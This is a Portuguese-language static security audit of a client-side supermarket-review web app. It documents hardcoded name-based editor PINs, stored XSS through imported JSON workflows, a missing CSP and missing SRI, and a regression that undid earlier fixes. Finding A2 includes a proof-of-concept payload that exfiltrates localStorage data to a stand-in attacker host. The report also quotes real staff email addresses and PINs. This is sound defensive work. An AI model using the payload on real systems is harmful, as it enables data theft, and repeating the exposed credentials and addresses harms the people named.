# Auditoria de Segurança — `qzte/supermercados`

**Data:** 2026-08-04
**Versão auditada:** v3.15.1 (`ec2a05a`)
**Alvo:** `src/index.src.html` (fonte), `index.html` (servido), `tools/build.mjs`,
`.github/workflows/build.yml`, `workflow-default.json`, `email-template.json`,
`manifest.webmanifest`, histórico Git.

---

## Contexto e modelo de ameaça

A aplicação é **100 % client-side**: um único HTML servido por GitHub Pages, sem
backend, sem API, sem base de dados. Todo o estado vive em `localStorage` e em
ficheiros JSON trocados manualmente entre utilizadores.

Isto elimina classes inteiras de risco (injecção SQL, SSRF, IDOR, gestão de
sessão) mas tem uma consequência que enquadra tudo o que se segue: **não existe
fronteira de segurança entre a aplicação e o utilizador**. Nenhum controlo
implementado no cliente pode impedir alguém com acesso ao browser de fazer o que
quiser. Os achados abaixo classificam-se, por isso, em duas famílias:

1. **Riscos reais** — código que pode ser explorado por *terceiros* (ficheiros
   maliciosos, CDN comprometida, dados públicos).
2. **Controlos decorativos** — mecanismos que aparentam proteger e não protegem,
   perigosos sobretudo por criarem falsa confiança na integridade dos registos.

Adversários considerados: (a) quem acede ao repositório e ao site públicos;
(b) quem envia um ficheiro JSON de workflow/backup a um utilizador legítimo;
(c) comprometimento de uma CDN de terceiros; (d) utilizador interno a adulterar
o histórico do processo.

---

## Resumo executivo

| # | Achado | Severidade | Explorável por terceiros |
|---|---|---|---|
| A1 | PINs de editor em claro no ficheiro servido | **Alta** | Sim |
| A2 | XSS armazenado via ficheiro de workflow/backup importado | **Alta** | Sim |
| A3 | Ausência total de Content-Security-Policy | **Média** | Amplifica A2/A4 |
| A4 | Scripts de terceiros (CDN) sem Subresource Integrity | **Média** | Sim |
| A5 | Dados pessoais e institucionais em repositório público | **Média** | Sim |
| A6 | Integridade dos dados não verificável (registos adulteráveis) | **Média** | Interno |
| A7 | `xlsx` 0.18.5 e restantes bibliotecas CDN desactualizadas | **Baixa** | Improvável |
| A8 | `eval()` na geração de PDF | **Baixa** | Não (hoje) |
| A9 | GitHub Actions com `contents: write` e actions não fixadas por SHA | **Baixa** | Interno |
| A10 | **Regressão:** correcções de segurança anteriores foram perdidas | **Processo** | — |

Duas prioridades sobressaem: **A2** (única via de execução de código por um
atacante externo) e **A10** (o repositório já teve estas correcções e perdeu-as;
sem mudar o processo, voltará a perdê-las).

---

## Achados detalhados

### A1 — PINs de editor em claro no ficheiro servido · **Alta**

**Evidência** — `src/index.src.html:662` (e `index.html:663`, publicado):

```js
window.__ULSM_EDITOR_PINS = ["JOAQUIM", "MARTA", "MARIANA", "JESSICA", "ANA"];
```

A validação (`src/index.src.html:668-675`) compara a entrada com esta lista,
ignorando maiúsculas e espaços.

**Impacto** — O ficheiro é público em <https://qzte.github.io/supermercados/> e
em <https://github.com/qzte/supermercados>. Qualquer visitante lê a lista com
*Ver código-fonte*. O modo editor — que permite reescrever o workflow, os
templates de e-mail e os registos dos processos — está efectivamente aberto.
Acresce que os PINs são **nomes próprios de pessoas reais**, adivinháveis mesmo
sem ler o código, e a sua publicação constitui divulgação desnecessária de dados
pessoais (ver A5).

**Nota de enquadramento** — Sendo a aplicação puramente client-side, *nenhum*
esquema de PIN oferece segurança real: quem quiser contorná-lo altera o estado
React na consola. O PIN só faz sentido como travão contra edição acidental. Na
forma actual não cumpre sequer esse papel e ainda expõe nomes.

**Recomendação**
- Curto prazo: substituir a lista por hashes SHA-256 injectados em runtime — foi
  exactamente o que o commit `e398354` fez e que se perdeu (ver A10) — e falhar
  em modo seguro (editor desactivado) quando não houver hash configurado.
- Correcto: se a integridade dos registos importa, autenticar no servidor
  (SSO/OIDC da instituição) — o que implica deixar de ser uma app só de cliente.
- Em qualquer caso: **não usar nomes de pessoas como credencial**.

---

### A2 — XSS armazenado via ficheiro de workflow/backup importado · **Alta**

Este é o achado com maior impacto explorável.

**Evidência** — dois sinks de HTML sem sanitização em
`src/index.src.html:6849` e `6869`:

```jsx
<div className="phase-title" style={{color}}
     dangerouslySetInnerHTML={{__html: ph.label || ph.title || ''}} />
...
<div dangerouslySetInnerHTML={{__html:
  (step.instructions || step.body || '')
    .replace(/<button[^>]*class="email-btn"[^>]*>[\s\S]*?<\/button>/gi, '')
    .replace(/\n/g, '<br>')
}} />
```

O `.replace()` remove um botão específico; **não é sanitização** e não impede
`<img>`, `<svg>`, `<iframe>` nem atributos de evento.

O valor chega até ali sem qualquer validação. `buildPhasesFromData()`
(`src/index.src.html:974-991`) copia `label` e `instructions` tal e qual:

```js
label: ph.label || ph.title || `Fase ${idx+1}`,
...
instructions: s.instructions || s.body || '',
```

**Vias de entrada** (todas terminam em `buildPhasesFromData`):

| Via | Localização |
|---|---|
| Backup JSON escolhido pelo utilizador | `loadFromFile` → `normalizeBackup` (`:2955`, `workflow: parsed.workflow`) |
| Template de workflow importado | `<input type="file" accept=".json">` (`:575`, `:5688`, `:6509`) |
| `workflow-default.json` obtido por `fetch` | ecrã de arranque, origem "publicada" |
| `localStorage['workflowTemplate']` | reaplicado em cada arranque (`:1731`, `:8200`) |

Como o workflow importado é gravado em `localStorage` (`:1177`, `:5448`,
`:8200`), o payload **persiste entre sessões** — é XSS armazenado, não reflectido.

**Prova de conceito** — basta que um utilizador importe um ficheiro contendo:

```json
{ "phases": [ { "label": "<img src=x onerror=\"alert(document.domain)\">",
                "steps": [ { "instructions": "<img src=x onerror=\"fetch('https://atacante/'+btoa(localStorage.getItem('ulsm_procs')))\">" } ] } ] }
```

**Impacto** — Execução de JavaScript na origem `qzte.github.io`, com acesso a
todo o `localStorage` (registos de processos, plano anual, templates de e-mail).
Permite exfiltrar os dados dos processos, alterar silenciosamente destinatários e
conteúdos dos templates de e-mail institucional (que dirigem correspondência real
para endereços `@ulsm.min-saude.pt`), e falsificar registos. A troca de ficheiros
JSON entre colegas é **o mecanismo normal de partilha desta aplicação**, o que
torna o vector plausível, não teórico.

**Recomendação — a correcção mais simples é também a mais forte.**
Verifiquei o `workflow-default.json` publicado: **nenhum dos passos contém
etiquetas HTML nas instruções** (0 em todos os passos das 7 fases). O
`dangerouslySetInnerHTML` não está a servir nada que o texto simples não sirva.
Portanto:

1. Trocar ambos os sinks por texto — `{ph.label}` e `{step.instructions}` — com
   `white-space: pre-wrap` no CSS para manter as quebras de linha que hoje se
   obtêm via `.replace(/\n/g, '<br>')`. Isto **elimina a classe de vulnerabilidade**
   em vez de a filtrar.
2. Se o HTML rico for mesmo um requisito futuro do editor, então sanitizar com
   DOMPurify (com SRI) antes de renderizar, e nunca confiar em `.replace()`.
3. Complementarmente, validar o workflow importado com um `sanitizeWorkflow()`
   equivalente ao `sanitizeProcs()` que já existe (`:2605`) e que — bem — já
   protege o caminho dos processos com `toSafeText()`. O workflow é hoje a única
   parte do backup que escapa a essa validação.

**Nota relacionada** — `serializeWorkflow()` lê `innerHTML` dos elementos
`contenteditable` (`:1147`, `:1156`). Colar texto formatado (de Word, de uma
página web) no editor grava markup arbitrário no template, que depois volta pelos
mesmos sinks. Mesmo sem atacante, isto polui os dados; com a correcção acima,
deve passar a `textContent`.

---

### A3 — Ausência de Content-Security-Policy · **Média**

**Evidência** — nem `src/index.src.html` nem `index.html` contêm
`<meta http-equiv="Content-Security-Policy">`. O GitHub Pages não permite
configurar cabeçalhos HTTP, pelo que a `meta` é a única via disponível.

**Impacto** — Nada limita o que um script injectado (A2) ou uma CDN comprometida
(A4) pode fazer: qualquer origem de exfiltração está disponível. Uma CSP não
corrige A2, mas transforma "exfiltração silenciosa de todos os dados" em
"execução bloqueada ou sem canal de saída".

**Recomendação** — acrescentar ao `<head>` (antes de qualquer `<script>`):

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
  style-src  'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src   https://fonts.gstatic.com;
  img-src    'self' data: blob:;
  connect-src 'self';
  frame-src  blob: data:;
  base-uri   'none';
  form-action 'none';
  object-src 'none'">
```

Observações de implementação:
- `'unsafe-inline'` em `script-src` é hoje inevitável — o `build.mjs` emite o
  código compilado num `<script>` inline. É preferível calcular o **hash SHA-256
  do bloco** no build e emitir `'sha256-…'`, eliminando o `'unsafe-inline'`; a
  alteração cabe em poucas linhas de `tools/build.mjs`.
- `connect-src 'self'` é suficiente: os únicos `fetch()` da app são os três JSON
  relativos.
- `frame-src blob: data:` é necessário para o visualizador de PDF (`:1873`) e
  para o `iframe.srcdoc` da exportação (`:7366`).
- **`'unsafe-eval'` foi deliberadamente omitido** — vai colidir com A8; ver ali.
- Validar em `file://`, cenário que o README documenta como suportado.

---

### A4 — Scripts de terceiros sem Subresource Integrity · **Média**

**Evidência** — `src/index.src.html:19-21` (React, ReactDOM, Babel) e o
carregamento dinâmico em `loadLib()` (`:7183-7189`), usado para
`jspdf` (`:7375`), `html2canvas` (`:7376`) e `xlsx` (`:7409`). Nenhum tem
atributo `integrity`. O `crossorigin` e o `referrerpolicy` já estão presentes —
falta apenas o `integrity`, que é o que garante que o ficheiro não mudou.

**Impacto** — Comprometimento do cdnjs (ou de DNS/TLS no percurso) resulta em
execução de código arbitrário na aplicação, com o mesmo alcance descrito em A2.
São **cinco** bibliotecas de terceiros a correr com plena confiança.

**Recomendação**
- Acrescentar `integrity="sha384-…"` às três tags estáticas (o cdnjs publica os
  hashes na sua interface).
- Estender `loadLib()` para aceitar e aplicar o hash:
  ```js
  async function loadLib(url, check, integrity) {
    if (check()) return;
    await new Promise((resolve, reject) => {
      const s = document.createElement('script');
      s.src = url;
      if (integrity) { s.integrity = integrity; s.crossOrigin = 'anonymous'; }
      s.referrerPolicy = 'no-referrer';
      s.onload = resolve; s.onerror = reject;
      document.head.appendChild(s);
    });
  }
  ```
- Alternativa mais robusta, e coerente com a filosofia do repositório (tudo
  servido da raiz): **alojar as bibliotecas localmente**. Elimina A4 por completo,
  permite `script-src 'self'` na CSP e faz a app funcionar sem rede — hoje, se o
  cdnjs estiver inacessível, a aplicação não arranca de todo (o próprio
  `bootGuard` o admite, `:54`).

---

### A5 — Dados pessoais e institucionais em repositório público · **Média**

**Evidência** — `email-template.json` (e as cópias inline no HTML) contêm
endereços nominais reais:

```
filipe.sousa@ulsm.min-saude.pt      marta.lourenco@ulsm.min-saude.pt
vera.soares.lopes@ulsm.min-saude.pt tsdt.farmacia@ulsm.min-saude.pt
gestao.supermercados@ulsm.min-saude.pt  uticos_ulsm@ulsm.min-saude.pt
```

Somam-se os cinco nomes próprios usados como PIN (A1).

**Impacto** — O repositório e o site são públicos e indexáveis. O conjunto
"nomes + endereços + estrutura interna do processo + templates de e-mail reais"
é material pronto para *phishing* dirigido contra uma unidade de saúde: um
atacante consegue reproduzir a linguagem, os remetentes e o momento exacto do
processo em que cada mensagem é esperada. É também uma questão de minimização de
dados à luz do RGPD.

**Recomendação**
- Substituir os endereços nominais por *placeholders* — o mecanismo já existe: o
  `renderEmailBody()` (`:777`) trata `<FILL>…</FILL>` como campo a preencher.
  `<FILL>endereço do gestor</FILL>` funciona sem qualquer código novo.
- Manter apenas endereços genéricos de função (`gestao.supermercados@…`) se forem
  mesmo necessários.
- Se a substituição não for viável, **tornar o repositório privado** e publicar
  por GitHub Pages privado ou por alojamento interno.
- Notar que a remoção só resolve o futuro: os endereços permanecem no histórico
  Git (ver A10) e podem já estar indexados.

**Ponto positivo** — o `ulsm_supermercados_backup.json` versionado está vazio
(`"data": []`) e, verificado em todo o histórico, **nunca** conteve registos
reais. O desenho de manter os dados fora do repositório está a ser respeitado.

---

### A6 — Integridade dos dados não verificável · **Média** (risco de negócio)

**Evidência** — Todo o estado reside em `localStorage` e em ficheiros JSON sem
assinatura nem *checksum*. `createStorageEnvelope()` (`:2617`) grava `version` e
`updatedAt`, que são metadados informativos, não garantias.

**Impacto** — Qualquer utilizador local (ou extensão de browser) pode alterar
datas de conclusão, responsáveis e notas de um processo sem deixar rasto. Como a
aplicação apresenta um "modo editor" protegido por PIN, os registos aparentam ter
controlo de acesso e trilho de auditoria que **não existem**. Para um processo
de revisão com valor de auditoria interna, é este o risco com maior consequência
prática, ainda que não seja uma "vulnerabilidade" no sentido clássico.

**Recomendação** — Decidir explicitamente o modelo:
- Se os registos precisam de valor probatório: persistência do lado do servidor,
  com autenticação e log imutável. Nada feito no cliente substitui isto.
- Se a app se mantém local: assumir e **documentar** que os dados são
  auto-declarados, acrescentar um `sha256` do bloco `data` no envelope para
  detectar corrupção acidental (não adulteração intencional), e deixar de
  apresentar o PIN como controlo de acesso.

---

### A7 — Bibliotecas de terceiros desactualizadas · **Baixa**

| Biblioteca | Versão | Situação |
|---|---|---|
| `xlsx` (SheetJS) | 0.18.5 | CVE-2023-30533 (*prototype pollution*, corrigido em 0.19.3); CVE-2024-22363 (ReDoS, corrigido em 0.20.2) |
| `jspdf` | 2.5.1 | Vários anos de correcções em atraso (actual: série 3.x) |
| `html2canvas` | 1.4.1 | Sem manutenção activa |
| `react` / `react-dom` | 18.2.0 | Sem CVE conhecido; desactualizado |

**Exploração** — Baixa. Ambos os CVE do `xlsx` estão no caminho de **leitura** de
ficheiros; a aplicação só usa `aoa_to_sheet`/`writeFile`, isto é, **escreve**
(`:7409-7467`). Não há entrada controlada por atacante no *parser*.

**Nota importante** — Estas dependências vêm de CDN e **não constam do
`package.json`**, pelo que o `npm audit` não as vê (corri-o: 0 vulnerabilidades —
resultado que diz respeito apenas ao Babel do build). Não existe hoje nenhum
processo que sinalize CVE nestas cinco bibliotecas.

**Recomendação** — Actualizar `jspdf` e `html2canvas`; para o SheetJS, notar que
saiu do npm e é distribuído em `cdn.sheetjs.com`. Ao alojar as bibliotecas
localmente (A4), passam a ser rastreáveis por ferramentas de dependências.

---

### A8 — `eval()` na geração de PDF · **Baixa**

**Evidência** — `src/index.src.html:7319-7323`:

```js
const cleanFnSrc = fillFnSource.replace(/;\s*$/, '');
iframeWin.eval(`(${cleanFnSrc})(${JSON.stringify(fillData)});`);
```

`fillFnSource` é extraído por expressão regular dos templates HTML embutidos
(`extractFn`, `:7385-7388`).

**Avaliação** — **Não é explorável hoje**: a fonte é uma constante do próprio
ficheiro (`window.__ULSM_TEMPLATE_MENSAL`/`_ANUAL`), não entrada do utilizador.
Fica registado por três razões: é um sink de execução de código a poucos passos
de dados variáveis; extrair código por regex sobre HTML é frágil e uma edição
inocente do template pode partir a correspondência; e **obriga a `'unsafe-eval'`
na CSP** (A3), enfraquecendo-a para toda a aplicação.

**Recomendação** — Injectar a função por declaração no `srcdoc` do iframe e
invocá-la por referência (`iframeWin.ULSM_fillMonthlyReport(data)`), em vez de a
reconstruir a partir de texto. Remove o `eval` e permite uma CSP sem
`'unsafe-eval'`.

---

### A9 — Pipeline de CI · **Baixa**

**Evidência** — `.github/workflows/build.yml`: `permissions: contents: write`,
gatilho `on: push` em **todos** os branches, executa `npm ci` e
`node tools/build.mjs`, e faz `git push` com o `GITHUB_TOKEN`.

**Avaliação** — Correctamente desenhado no essencial: só `push` (nunca
`pull_request_target`), pelo que **forks não conseguem accionar o workflow** — o
comentário no ficheiro mostra que a decisão foi ponderada. O risco residual é
que qualquer pessoa com permissão de escrita possa executar código arbitrário
com um token de escrita, alterando `tools/build.mjs` ou um script de
`package.json`. Quem tem escrita já pode escrever, pelo que a escalada é mínima.

**Recomendação** (endurecimento, não urgência)
- Fixar as actions por SHA em vez de tag móvel: `actions/checkout@v4` →
  `actions/checkout@<sha>`. Uma tag pode ser reapontada.
- `actions/checkout` com `persist-credentials: false` e usar um token explícito
  apenas no passo de push.
- Considerar `npm ci --ignore-scripts` (o build só precisa do Babel).

---

### A10 — Regressão: correcções de segurança anteriores foram perdidas · **Processo**

Este achado explica por que razão vários dos anteriores existem.

O repositório **já tinha** estas correcções aplicadas. Três commits, todos
ancestrais de `main`:

| Commit | Data | O que fez |
|---|---|---|
| `e398354` | 2026-02-27 | Removeu o PIN fixo; passou a validar SHA-256 contra hash injectado em runtime |
| `a7f6e88` | 2026-02-27 | Verificação de integridade do estado e validação de esquema |
| `2071ee1` | 2026-02-27 | Endureceu a CSP |
| `44f0116` | 2026-03-02 | Endureceu a autenticação do editor e sanitizou a serialização dos passos |

Nenhuma destas defesas existe no código actual. O motivo é visível no histórico:
as correcções foram aplicadas a `ulsm_supermercados.jsx` e
`workflow_supermercados.html`, ficheiros posteriormente **substituídos por
commits "Add files via upload"** (`4e8098f`, 2026-03-01; `d61b47f`, 2026-07-19)
— carregamentos de cópias locais que não continham as correcções. O
`SECURITY_AUDIT.md` que as documentava foi apagado em `53e206b` (2026-07-24).

Ou seja: **o trabalho de segurança foi silenciosamente desfeito por substituição
de ficheiros**, sem conflito de merge e sem aviso. O padrão repetiu-se duas
vezes com quatro meses de intervalo, e voltará a repetir-se enquanto o fluxo for
"editar uma cópia local e fazer upload".

Consequência adicional: o PIN antigo `ulsm2025` permanece legível no histórico
público (`SECURITY_AUDIT.md`, `dc02567` e outros), tal como qualquer credencial
que venha a ser removida por commit — **remover do ficheiro não remove do Git**.

**Recomendação**
- Deixar de usar "Add files via upload" para actualizar a aplicação. O
  `src/index.src.html` é hoje a fonte única e o `build.mjs` já garante coerência
  do resto; editar aí, com PR.
- Manter este documento versionado e revê-lo a cada alteração relevante.
- Considerar um teste no `build.mjs` que falhe o build perante padrões proibidos
  (ex.: lista de PINs em claro, `dangerouslySetInnerHTML` sem sanitização) —
  o ficheiro já usa esta técnica com sucesso para o Babel e para o esquema do
  `workflow-default.json`. Uma verificação equivalente teria impedido a regressão.
- Tratar `ulsm2025` e os PINs actuais como **comprometidos e públicos**; qualquer
  credencial futura tem de ser rodada, não apagada.

---

## O que está bem feito

Registado por ser relevante para a avaliação e para não ser desfeito:

- **`renderEmailBody()`** (`:777`) constrói o corpo do e-mail com
  `createTextNode`/`textContent` e `DocumentFragment`. É a abordagem correcta e
  contrasta com os sinks de A2 — o padrão seguro já existe no ficheiro.
- **`sanitizeProcs()` / `sanitizeProc()` / `sanitizePlan()`** (`:2605` e
  seguintes) validam esquema, tipos e comprimentos (`toSafeText`, `toSafeDate`)
  em todos os dados de processos importados, e resolvem colisões de `id`. Sólido.
  A lacuna é apenas o `workflow` (A2).
- **`bootGuard`** (`:28-70`) constrói a interface de erro com `createElement` e
  `textContent`, sem `innerHTML`.
- **`openEmail()`** (`:1762`) usa `textContent` em todos os campos.
- **`crossorigin` + `referrerpolicy="no-referrer"`** nas tags de CDN — falta só
  o `integrity`.
- Sem segredos de API, chaves ou tokens no repositório ou no histórico
  (verificado).
- `npm audit`: 0 vulnerabilidades nas dependências de build.
- O backup versionado nunca conteve dados reais.
- A decisão de usar apenas `on: push` no CI (excluindo forks) está correcta e
  documentada.

---

## Plano de remediação sugerido

**Prioridade 1 — fazer já**
1. **A2**: substituir os dois `dangerouslySetInnerHTML` por texto com
   `white-space: pre-wrap`. Correcção pequena, sem perda funcional (o workflow
   publicado não contém HTML), elimina a classe de vulnerabilidade.
2. **A1**: retirar os PINs em claro; hashes SHA-256 injectados em runtime, ou
   assumir a app como sem controlo de acesso e remover a fachada.
3. **A5**: substituir os endereços nominais por `<FILL>`, ou tornar o
   repositório privado.

**Prioridade 2 — próxima iteração**
4. **A3**: acrescentar a `meta` CSP (idealmente com hash do script inline
   calculado no build).
5. **A4**: `integrity` nas cinco bibliotecas de CDN, ou alojá-las localmente —
   o que também resolve o arranque sem rede.
6. **A10**: guarda no `build.mjs` contra padrões proibidos; abandonar o fluxo de
   upload de ficheiros.

**Prioridade 3 — quando houver oportunidade**
7. **A8**: eliminar o `eval()` da exportação de PDF.
8. **A7**: actualizar `jspdf`/`html2canvas`; rastrear as dependências de CDN.
9. **A9**: fixar as actions por SHA; `persist-credentials: false`.
10. **A6**: decidir e documentar o modelo de confiança dos registos.

---

## Limitações desta auditoria

Análise **estática** do código, da configuração e do histórico Git na revisão
`ec2a05a`. Não foram executados testes dinâmicos contra a instância publicada,
nem verificadas as definições da conta GitHub (protecção de branch,
colaboradores, configuração do Pages), nem revistos os ficheiros HTML arquivados
de versões anteriores — que, sendo gerados e idênticos ao `index.html`, partilham
os mesmos achados.

As provas de conceito apresentadas foram derivadas por leitura do código e não
foram executadas contra o sistema em produção.
